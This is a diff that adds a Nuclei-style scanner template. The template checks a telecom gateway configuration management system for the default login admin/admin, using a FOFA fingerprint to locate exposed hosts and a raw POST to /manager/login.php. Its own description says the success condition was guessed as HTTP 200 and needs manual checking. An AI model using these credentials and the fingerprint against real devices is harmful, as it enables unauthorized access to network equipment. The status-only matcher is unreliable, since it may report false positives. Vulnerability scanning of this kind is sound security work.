@@ -1,0 +1,24 @@
+id: poc-mgfa4zk3h9rmrx77
+info:
+  name: 电信网关配置管理系统存在弱口令
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgfa4zk3h9rmrx77
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: default-login,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mgfa4zk3h9rmrx77
+    fofa: body="styles/head.css" && body="系统登录"
+http:
+- raw:
+  - 'POST /manager/login.php HTTP/1.1
+
+
+    Name=admin&Pass=admin'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
